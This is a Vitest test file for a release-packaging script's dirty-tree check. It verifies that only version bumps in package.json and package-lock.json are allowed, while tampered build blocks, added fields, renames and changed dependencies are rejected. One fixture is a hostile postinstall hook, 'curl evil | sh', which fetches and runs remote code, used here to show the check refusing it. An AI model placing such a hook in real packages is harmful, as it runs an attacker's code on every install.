/**
 * The one dirty-tree exemption the packaging wrapper allows.
 *
 * The release workflow computes the version itself and writes it to the working tree WITHOUT
 * committing (a commit would be a push to main, which would retrigger the release). That leaves
 * package.json and package-lock.json dirty, and the wrapper refused outright — which is exactly how
 * the first automatic release died, after the version pipeline had already done its job correctly.
 *
 * The exemption has to stay narrow, because package.json is not only the version: it also carries
 * the entire electron-builder `build` block. "package.json is dirty, never mind" would wave through
 * a changed appId, target list or signing flag on a build claiming a public commit's provenance.
 */
import { describe, expect, it } from 'vitest'
import {
  changedSourcePaths,
  isVersionOnlyManifestChange,
  requireCleanSourceStatus,
} from '../../scripts/windows-installer.mjs'

const pkg = (extra: Record<string, unknown>) =>
  JSON.stringify({ name: 'node-terminal', version: '0.4.3', build: { appId: 'com.nodeterm.app' }, ...extra })

describe('changedSourcePaths', () => {
  it('is null for a clean tree', () => {
    expect(changedSourcePaths('')).toBeNull()
    expect(changedSourcePaths('\n  \n')).toBeNull()
  })

  it('reads the path out of porcelain v1 entries, including untracked', () => {
    expect(changedSourcePaths(' M package.json\n?? scratch.txt')).toEqual(['package.json', 'scratch.txt'])
  })

  it('survives the leading space being trimmed off the first line — the production shape', () => {
    // runGit() calls .trim() on git's output, which eats porcelain's MEANINGFUL leading space on
    // the FIRST line only (" M path" = modified but not staged). A fixed slice(3) then ate the
    // first character of the path, reported `ackage-lock.json`, matched nothing in the allowlist,
    // and failed a real release with a message nobody could act on. The original clean-check never
    // noticed because it only asked whether the whole string was empty.
    expect(changedSourcePaths('M package-lock.json')).toEqual(['package-lock.json'])
    // First line trimmed, the rest still carrying their leading space — what git actually hands us.
    expect(changedSourcePaths('M package.json\n M package-lock.json')).toEqual([
      'package.json',
      'package-lock.json',
    ])
  })

  it('takes the NEW path of a rename', () => {
    // `R  old -> new`. Reporting the old path would let a rename INTO a build file slip past the
    // allowlist under the old name.
    expect(changedSourcePaths('R  build/icon.ico -> package.json')).toEqual(['package.json'])
  })
})

describe('isVersionOnlyManifestChange', () => {
  it('accepts a pure version bump', () => {
    expect(isVersionOnlyManifestChange(pkg({}), pkg({ version: '0.4.4' }).replace('"0.4.3"', '"0.4.4"'))).toBe(true)
  })

  it('rejects a changed build block riding along with the bump', () => {
    const committed = pkg({})
    const working = JSON.stringify({
      name: 'node-terminal',
      version: '0.4.4',
      build: { appId: 'com.attacker.app' },
    })
    expect(isVersionOnlyManifestChange(committed, working)).toBe(false)
  })

  it('rejects an added field', () => {
    expect(isVersionOnlyManifestChange(pkg({}), pkg({ scripts: { postinstall: 'curl evil | sh' } }))).toBe(false)
  })

  it('refuses rather than assumes when either side is unparsable', () => {
    // "Could not read it" is not "only the version changed".
    expect(isVersionOnlyManifestChange('{not json', pkg({}))).toBe(false)
    expect(isVersionOnlyManifestChange(pkg({}), 'null')).toBe(false)
  })
})

describe('requireCleanSourceStatus', () => {
  const bumped = (relative: string) => ({
    committed: pkg({}),
    working: relative === 'package.json' ? pkg({}).replace('"0.4.3"', '"0.4.4"') : pkg({}),
  })

  it('passes a clean tree with no reader at all', () => {
    expect(() => requireCleanSourceStatus('')).not.toThrow()
  })

  it('allows the two manifests when they differ only by version', () => {
    expect(() => requireCleanSourceStatus(' M package.json\n M package-lock.json', bumped)).not.toThrow()
  })

  it('still refuses any OTHER dirty path, even alongside a legitimate bump', () => {
    expect(() => requireCleanSourceStatus(' M package.json\n M src/main/index.ts', bumped)).toThrow(/dirty source tree/)
  })

  it('refuses a dirty manifest when no reader is supplied to prove it is only a bump', () => {
    expect(() => requireCleanSourceStatus(' M package.json')).toThrow(/dirty source tree/)
  })

  it('refuses when package.json changed by more than its version', () => {
    const tampered = () => ({ committed: pkg({}), working: pkg({ build: { appId: 'com.attacker.app' } }) })
    expect(() => requireCleanSourceStatus(' M package.json', tampered)).toThrow(/more than its version/)
  })
})

describe('package-lock.json carries the version twice', () => {
  const lock = (version: string) =>
    JSON.stringify({
      name: 'node-terminal',
      version,
      lockfileVersion: 3,
      packages: { '': { name: 'node-terminal', version }, 'node_modules/x': { version: '1.0.0' } },
    })

  it('accepts a bump that updates BOTH the root and packages[""] version', () => {
    // `npm version` writes both. Neutralising only the top-level one would read the second as an
    // unrelated change and refuse the very bump the exemption exists for.
    expect(isVersionOnlyManifestChange(lock('0.4.3'), lock('0.4.4'))).toBe(true)
  })

  it('still rejects a changed DEPENDENCY version riding along', () => {
    const tampered = JSON.stringify({
      name: 'node-terminal',
      version: '0.4.4',
      lockfileVersion: 3,
      packages: { '': { name: 'node-terminal', version: '0.4.4' }, 'node_modules/x': { version: '9.9.9' } },
    })
    expect(isVersionOnlyManifestChange(lock('0.4.3'), tampered)).toBe(false)
  })
})
